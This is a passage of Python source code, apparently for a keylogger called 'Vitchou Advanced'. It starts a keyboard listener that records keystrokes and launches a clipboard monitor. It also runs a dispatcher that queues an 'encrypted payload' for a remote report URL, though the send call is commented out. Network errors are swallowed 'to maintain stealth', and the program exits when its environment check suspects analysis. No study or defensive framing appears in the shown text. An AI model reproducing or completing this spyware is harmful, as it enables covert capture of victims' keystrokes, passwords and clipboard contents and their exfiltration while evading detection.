                try:
                    # Simulation of a secure POST request
                    print(f"[Vitchou-System] Dispatching encrypted payload...")
                    # await client.post(CONFIG["REPORT_URL"], content=encrypted_payload)
                except Exception as e:
                    # Silently fail on network errors to maintain stealth
                    pass 
                
                self.queue.task_done()

    def start(self):
        """Initialize all services and listeners."""
        if not SecurityManager.is_safe_environment():
            print("Environment analysis detected. Exiting.")
            sys.exit(0)

        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)

        # Start the non-blocking keyboard listener
        listener = keyboard.Listener(on_press=self.on_press)
        listener.start()

        # Launch asynchronous tasks
        loop.create_task(self.clipboard_monitor())
        loop.create_task(self.data_dispatcher())
        
        try:
            loop.run_forever()
        except KeyboardInterrupt:
            print("\nVitchou Advanced stopped by user.")

